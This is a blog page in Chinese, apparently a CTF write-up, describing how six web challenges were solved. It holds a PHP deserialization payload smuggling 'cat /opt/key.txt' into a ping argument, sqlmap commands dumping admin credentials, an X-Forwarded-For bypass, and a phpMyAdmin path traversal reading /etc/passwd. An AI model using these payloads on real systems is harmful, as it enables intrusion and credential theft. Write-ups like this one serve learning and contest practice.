@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="YGm-O0FYtJIJd878GKblZACh8xSr46g0l4F5UDGhoTc">
+  <meta name="baidu-site-verification" content="code-tyOuGzoN3z">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css">
+  <script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yanmymickey.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="合天御宅战疫-web-wp签到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="合天御宅战疫-web-wp">
+<meta property="og:url" content="https://yanmymickey.github.io/2020/02/29/CTF_WP/hetian/index.html">
+<meta property="og:site_name" content="菜鸡的BLOG">
+<meta property="og:description" content="合天御宅战疫-web-wp签到">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim">
+<meta property="og:image" content="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim">
+<meta property="article:published_time" content="2020-02-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-16T05:40:07.400Z">
+<meta property="article:author" content="D15h35">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim">
+
+
+<link rel="canonical" href="https://yanmymickey.github.io/2020/02/29/CTF_WP/hetian/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+<title>合天御宅战疫-web-wp | 菜鸡的BLOG</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XZVDBPC6X7"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-XZVDBPC6X7');
+      }
+    </script>
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?633ffcf7a0f511eb45dead6c18798c6f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="菜鸡的BLOG" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">菜鸡的BLOG</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">31</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">16</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">58</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%88%E5%A4%A9%E5%BE%A1%E5%AE%85%E6%88%98%E7%96%AB-web-wp"><span class="nav-number">1.</span> <span class="nav-text">合天御宅战疫-web-wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%91%E8%A2%8B%E6%9C%89%E7%82%B9%E5%A4%A7"><span class="nav-number">1.2.</span> <span class="nav-text">脑袋有点大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%9F%E4%B8%80%E7%99%BB%E5%BD%95"><span class="nav-number">1.3.</span> <span class="nav-text">统一登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0key"><span class="nav-number">1.4.</span> <span class="nav-text">后台key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95"><span class="nav-number">1.5.</span> <span class="nav-text">后台登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpmyadmin"><span class="nav-number">1.6.</span> <span class="nav-text">phpmyadmin</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D15h35"
+      src="/images/while.png">
+  <p class="site-author-name" itemprop="name">D15h35</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yanmymickey" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yanmymickey" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yanmymickey" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yanmymickey.github.io/2020/02/29/CTF_WP/hetian/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/while.png">
+      <meta itemprop="name" content="D15h35">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜鸡的BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          合天御宅战疫-web-wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-02-29 00:00:00" itemprop="dateCreated datePublished" datetime="2020-02-29T00:00:00+08:00">2020-02-29</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-01-16 13:40:07" itemprop="dateModified" datetime="2021-01-16T13:40:07+08:00">2021-01-16</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/WP/" itemprop="url" rel="index"><span itemprop="name">WP</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="合天御宅战疫-web-wp"><a href="#合天御宅战疫-web-wp" class="headerlink" title="合天御宅战疫-web-wp"></a>合天御宅战疫-web-wp</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><a id="more"></a>
+
+<p>如图所示</p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim" alt="mark"></a></p>
+<p>改成key{XXXX}提交</p>
+<h2 id="脑袋有点大"><a href="#脑袋有点大" class="headerlink" title="脑袋有点大"></a>脑袋有点大</h2><p>用bp抓包,在响应中找到key</p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim" alt="mark"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim" alt="mark"></a></p>
+<h2 id="统一登录"><a href="#统一登录" class="headerlink" title="统一登录"></a>统一登录</h2><p>打开界面,要登陆,登录不上,用dirmap扫一下目录</p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim" alt="mark"></a></p>
+<p>找到源码泄露,下载下来</p>
+<p>代码审计</p>
+<p>在common文件夹下找到home.php,wakeup函数有一个waf过滤,最下方的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;@$_POST[&#39;a&#39;];</span><br><span class="line">@unserialize($a);</span><br></pre></td></tr></table></figure>
+<p>可以想到构造反序列化对象,直接执行我们构造的对象,利用system函数,home后面的数字大于2可以绕过wakeup函数从而绕过过滤</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;O:4:&quot;home&quot;:3:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:26:&quot;127.0.0.1;cat &#x2F;opt&#x2F;key.txt&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim" alt="mark"></a></p>
+<h2 id="后台key"><a href="#后台key" class="headerlink" title="后台key"></a>后台key</h2><p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim" alt="mark"></a></p>
+<p>存在数字型sql注入</p>
+<p>用sqlmap跑一下</p>
+<p>爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim" alt="mark"></a></p>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms --tables</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim" alt="mark"></a></p>
+<p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms -T manage --columns</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim" alt="mark"></a></p>
+<p>爆内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms -T manage -C user,password --dump</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim" alt="mark"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim" alt="mark"></a></p>
+<p>得到用户名和密码后,由于密码MD5加密了,所以用md5解密一下,得到密码登录系统,根据提示找到key</p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim" alt="mark"></a></p>
+<h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim" alt="mark"></a></p>
+<p>打开发现静止访问,但是响应码为200说明可能因为是后台登录系统做了限制,改xff头后顺利访问</p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim" alt="mark"></a></p>
+<p>使用万能密码登录,成功获取key</p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim" alt="mark"></a></p>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim" alt="mark"></a></p>
+<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim" alt="mark"></a></p>
+<p>根目录下面的robots.txt指明了key的位置</p>
+<p>通过增加常用文件名phpmyadmin,成功找到登录地址</p>
+<p>用弱口令root/root登录后,先尝试包含/etc/passwd判断目录层级</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim" alt="mark"></a></p>
+<p>然后再去包含key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;key.txt</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim" alt="mark"></a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="D15h35 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="D15h35 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/02/25/CTF_WP/gyctf_wp/" rel="prev" title="GYCTF——2020i春秋新春战疫CTF——网络安全公益赛">
+                  <i class="fa fa-chevron-left"></i> GYCTF——2020i春秋新春战疫CTF——网络安全公益赛
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/03/01/Note/linux%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/" rel="next" title="linux服务管理">
+                  linux服务管理 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D15h35</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+  <script>
+    NProgress.configure({
+      showSpinner: true
+    });
+    NProgress.start();
+    document.addEventListener('readystatechange', () => {
+      if (document.readyState === 'interactive') {
+        NProgress.inc(0.8);
+      }
+      if (document.readyState === 'complete') {
+        NProgress.done();
+      }
+    });
+    document.addEventListener('pjax:send', () => {
+      NProgress.start();
+    });
+    document.addEventListener('pjax:success', () => {
+      NProgress.done();
+    });
+  </script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
